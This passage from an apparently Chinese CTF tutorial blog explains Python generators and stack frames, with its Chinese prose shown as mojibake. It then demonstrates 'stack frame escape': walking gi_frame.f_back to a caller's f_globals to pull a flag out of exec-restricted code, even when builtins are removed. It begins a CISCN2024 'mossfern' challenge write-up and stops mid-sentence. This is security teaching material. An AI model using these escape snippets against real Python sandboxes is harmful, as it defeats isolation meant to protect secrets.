class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"><span class="comment">#ä¼šæ­£å¸¸è¾“å‡º1åˆ°19</span></span><br></pre></td></tr></table></figure><h2 id="2-ç”Ÿæˆå™¨è¡¨è¾¾å¼"><a class="markdownIt-Anchor" href="#2-ç”Ÿæˆå™¨è¡¨è¾¾å¼">#</a> 2ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼š</h2><p>â€‹ç”Ÿæˆå™¨è¡¨è¾¾å¼æ˜¯ä¸€ç§åœ¨ Python ä¸­åˆ›å»ºç”Ÿæˆå™¨çš„ç´§å‡‘å½¢å¼ã€‚ç±»ä¼¼äºåˆ—è¡¨æ¨å¯¼å¼ï¼Œç”Ÿæˆå™¨è¡¨è¾¾å¼å…è®¸ä½ ä½¿ç”¨ç®€æ´çš„è¯­æ³•æ¥å®šä¹‰ç”Ÿæˆå™¨ï¼Œè€Œä¸å¿…æ˜¾ç¤ºåœ°ç¼–å†™ä¸€ä¸ªå‡½æ•°ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼çš„ è¯­æ³•ä¸åˆ—è¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼Œä½†æ˜¯ä½¿ç”¨åœ†æ‹¬å·è€Œä¸æ˜¯æ–¹æ‹¬å·ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¼š é€ä¸ªç”Ÿæˆå€¼ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§ç”Ÿæˆ æ•´ä¸ªåºåˆ—ã€‚ã€‚è¿™æœ‰åˆ©äº æé«˜å†…å­˜çš„é¢ åˆ©ç”¨ç‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = (i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯ä»¥ç”¨nextä¸€æ­¥æ­¥ è·å–å€¼</span></span><br><span class="line"><span class="comment"># print(next(f))</span></span><br><span class="line"><span class="comment">#ä¹Ÿå¯ä»¥éå†è·å–æ‰€æœ‰å€¼</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><h2 id="3-ç”Ÿæˆå™¨å±æ€§"><a class="markdownIt-Anchor" href="#3-ç”Ÿæˆå™¨å±æ€§">#</a> 3ã€ç”Ÿæˆå™¨å±æ€§ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gi_code:ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚</span><br><span class="line">gi_frame:ç”Ÿæˆå™¨å¯¹åº”çš„frame(æ ˆå¸§)å¯¹è±¡</span><br><span class="line">gi_running:ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨<span class="keyword">yield</span>ä»¥åã€æ‰§è¡Œ<span class="keyword">yield</span>çš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§ä¸º<span class="number">0.</span></span><br><span class="line">gi_yeildfrom:å¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­<span class="keyword">yield</span>å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ï¼›å¦åˆ™ä¸º<span class="literal">None</span></span><br><span class="line">gi_frame.f_locals:ä¸€ä¸ªå­—å…¸ï¼Œï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰æ ˆçš„æœ¬åœ°å˜é‡</span><br></pre></td></tr></table></figure><h2 id="4-gi_frameçš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#4-gi_frameçš„ä½¿ç”¨">#</a> 4ã€gi_frame çš„ä½¿ç”¨ï¼š</h2><p>â€‹gi_frame æ˜¯ä¸€ä¸ªä¸ç”Ÿæˆå™¨å’Œåç¨‹ç›¸å…³çš„å±æ€§ã€‚å®ƒæŒ‡å‘ç”Ÿæˆå™¨æˆ–åç¨‹å½“å‰ æ‰§è¡Œçš„å¸§å¯¹è±¡ï¼Œå¦‚æœè¿™ä¸ªç”Ÿæˆå™¨æˆ–åç¨‹æ­£åœ¨æ‰§è¡Œçš„è¯ã€‚å¸§å¯¹è±¡ è¡¨ç¤ºä»£ç  æ‰§è¡Œçš„å½“å‰ä¸Šä¸‹æ–‡ï¼ŒåŒ…å«äº†å±€éƒ¨å˜é‡ã€æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ç­‰ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line">frame = f.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å±€éƒ¨å˜é‡(Local Variables):&quot;</span>,frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å…¨å±€å˜é‡(Gloobal Variables):&quot;</span>,frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Codeå¯¹è±¡:&quot;</span>,frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Insstruction Pointer:&quot;</span>,frame.f_lasti)</span><br></pre></td></tr></table></figure><p>â€‹è·å–ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç”Ÿæˆå™¨çš„å½“å‰ä»£ç ä¿¡æ¯</span></span><br><span class="line">code = gen.gi_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰ä»£ç ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">print</span>( code.co_name)</span><br><span class="line"><span class="built_in">print</span>(code.co_code)</span><br><span class="line"><span class="built_in">print</span>( code.co_consts)</span><br><span class="line"><span class="built_in">print</span>(code.co_filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># my_generator</span></span><br><span class="line"><span class="comment"># b&#x27;K\x00\x01\x00\x97\x00d\x01V\x00\x97\x01\x01\x00d\x02V\x00\x97\x01\x01\x00d\x03V\x00\x97\x01\x01\x00d\x00S\x00&#x27;</span></span><br><span class="line"><span class="comment"># (None, 1, 2, 3)</span></span><br><span class="line"><span class="comment"># C:\Users\20820\PycharmProjects\shizhan\bb.py</span></span><br></pre></td></tr></table></figure><h2 id="5-æ ˆå¸§-frameä»‹ç»"><a class="markdownIt-Anchor" href="#5-æ ˆå¸§-frameä»‹ç»">#</a> 5ã€æ ˆå¸§ (Frame) ä»‹ç»ï¼š</h2><p>â€‹åœ¨ Python ä¸­ï¼Œæ ˆå¸§ï¼ˆstack frameï¼‰ï¼Œä¹Ÿç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œæ˜¯ç”¨äºæ‰§è¡Œä»£ç çš„æ•°æ®ç»“æ„ã€‚æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œç”¨äºå­˜å‚¨è¯¥å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–æ‰§è¡Œç›¸å…³çš„ä¿¡æ¯ã€‚è¿™äº›æ ˆå¸§ä¼šæŒ‰ç…§è°ƒç”¨é¡ºåºè¢«ç»„ç»‡æˆä¸€ä¸ªæ ˆï¼Œç§°ä¸ºè°ƒç”¨æ ˆã€‚</p><p>â€‹æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼šf_locals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åã€‚f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚f_code: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚f_lasti: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚f_back: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚</p><p>â€‹æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š</p><blockquote><p><code>f_locals</code> : ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚<br> <code>f_globals</code> : ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚<br> <code>f_code</code> : ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚<br> <code>f_lasti</code> : æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚<br> <code>f_back</code> : æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚</p></blockquote><h2 id="6-æ ˆå¸§é€ƒé€¸"><a class="markdownIt-Anchor" href="#6-æ ˆå¸§é€ƒé€¸">#</a> 6ã€æ ˆå¸§é€ƒé€¸ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flagï¼šflag&#123;hello_World_hello_Python&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  <span class="comment">#ç”Ÿæˆå™¨</span></span><br><span class="line">    frame = <span class="built_in">next</span>(g) <span class="comment">#è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line">    b = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>] <span class="comment">#è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line">    <span class="comment"># b = frame.f_back.f_globals[&#x27;s3cret&#x27;]  # è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">b=waff()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#this is flagï¼šflag&#123;hello_World_hello_Python&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹åœ¨çœ‹çœ‹ä¸Šé¢çš„ <code>f_globals</code> : ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚</p><p>ä¸éš¾çœ‹å‡ºè¿™é‡Œå‡½æ•°å’Œæ¨¡å—æœ¬å°±åŒåœ¨ä¸€ä¸ªå…¨å±€ï¼Œæ‰€ä»¥éƒ½æœ‰å±æ€§ s3cretï¼Œæ€ä¹ˆçœ‹åˆ°æ²¡åˆ°å…¨å±€ï¼Ÿç›´æ¥çœ‹ file å°±èƒ½çœ‹å‡ºã€‚</p><p>â€‹åœ¨ç»™ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #ç”Ÿæˆå™¨</span></span><br><span class="line"><span class="string">    frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C309E7C40, file &#x27;test&#x27;, line 8, code waff&gt;</span></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C520AF560, file &#x27;test&#x27;, line 13, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C521A0040, file &#x27;C:\\Users\\20820\\PycharmProjects\\shizhan\\bb.py&#x27;, line 19, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="comment"># this is flag</span></span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œç”Ÿæˆå™¨çš„æ ˆå¸§æ˜¯ g ï¼Œç»è¿‡ä¸€æ¬¡å›æº¯ ä¹‹ååˆ°äº† waff çš„æ ˆå¸§ï¼Œå†å›æº¯ä¸€æ¬¡ä¹‹ååˆ°äº† exec çš„æ ˆå¸§ï¼Œè¿™ä¸ªæ—¶å€™è®¿é—® <code>f_globals</code>  å°±åˆ°äº† exec å†ä¸Šä¸€å±‚ çš„ä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯å…¨å±€å˜é‡ ã€‚</p><p>â€‹å¦ä¸€ç§æƒ…å†µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    q = (q.gi_frame.f_back.f_back.f_back.f_globals for _ in [1])</span></span><br><span class="line"><span class="string">    b = [*q][0][&quot;s3cret&quot;]</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure><p>â€‹è¿™æ ·ä¹Ÿèƒ½è¾“å‡º flagï¼Œå’Œä¸Šé¢çš„ç›¸æ¯”ï¼Œæ˜¯è¿›è¡Œäº†ä¸‰æ¬¡å›æº¯ï¼Œå…ˆæ¥ä¸€ä¸ªå›æº¯ç»“æ„ç¤ºæ„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä¸»ç¨‹åºå…¨å±€å¸§ (åŒ…å« s3cret)</span><br><span class="line">  â†‘</span><br><span class="line">exec æ‰§è¡Œç¯å¢ƒå¸§</span><br><span class="line">  â†‘</span><br><span class="line">waff() å‡½æ•°è°ƒç”¨å¸§</span><br><span class="line">  â†‘</span><br><span class="line">åˆ—è¡¨æ¨å¯¼å¼å¸§ ([*q] è¿­ä»£è§¦å‘)</span><br><span class="line">  â†‘</span><br><span class="line">ç”Ÿæˆå™¨ q çš„å¸§ (q.gi<span class="built_in">_</span>frame)</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œæ˜¯ç”Ÿæˆå™¨ q çš„å¸§ï¼Œå›æº¯ä¸€æ¬¡ä¹‹åæ˜¯ <code>[*q]</code>  è¿™ä¸€è¡Œ çš„å¸§ï¼Œä¹‹åæ‰æ˜¯ waff å’Œ exec çš„å¸§åˆ°äº† exec çš„å¸§ä¹‹åè·å– globals å°±å¯ä»¥è·å¾—åˆ° flag äº†ã€‚</p><p>â€‹ä¸ºä»€ä¹ˆç”¨ <code>[*q]</code>  è¿è¡Œç”Ÿæˆå™¨ï¼Œå´ä¸ç”¨ <code>next(q)</code> ï¼Ÿä¸»è¦æ˜¯å› ä¸ºï¼Œå¤§éƒ¨åˆ†çš„æ²™ç®±é¢˜ç›®ä¸­ï¼Œ <code>builtins</code>  åŸºæœ¬ä¸Šéƒ½è¢«æ¨äº†ï¼Œä¸èƒ½ä½¿ç”¨ next æ¥è¿›è¡Œè·å–ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨è¿™ç§åŠæ³•ã€‚</p><h2 id="æ¥ä¸ªä¾‹é¢˜ciscn2024-mossfern"><a class="markdownIt-Anchor" href="#æ¥ä¸ªä¾‹é¢˜ciscn2024-mossfern">#</a> æ¥ä¸ªä¾‹é¢˜ (CISCN2024 mossfern)ï¼š</h2><p>â€‹main.py çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>â€‹æ²¡å•¥å¤ªå¤§å¾—åˆ°ç”¨å¤„ï¼Œå¤§æ¦‚å°±æ˜¯æ¯ä¸€æ¬¡è®¿é—® <code>/run</code> <span class="exturl" data-url="aHR0cDovL3huLS11dWlkLWs4NGZ1aXQxMWd0eGt1eTViZGZheDAwei5weQ=="> è·¯ç”±å°±ç”Ÿæˆä¸€ä¸ª uuid.py</span>ï¼Œå°† flag æ›¿æ¢è¿›æ–‡ä»¶å ä½ç¬¦ï¼Œä¹‹åï¼Œå†ç”Ÿæˆä¸€ä¸ª uuid.txt æ–‡ä»¶ï¼Œå°†ç”¨æˆ·ä¸Šä¼ çš„ä»£ç å†™å…¥ï¼Œä¹‹åè¿è¡Œä»£ç ï¼Œå¹¶ç»“æœè¿”å›ã€‚</p><p>â€‹<span 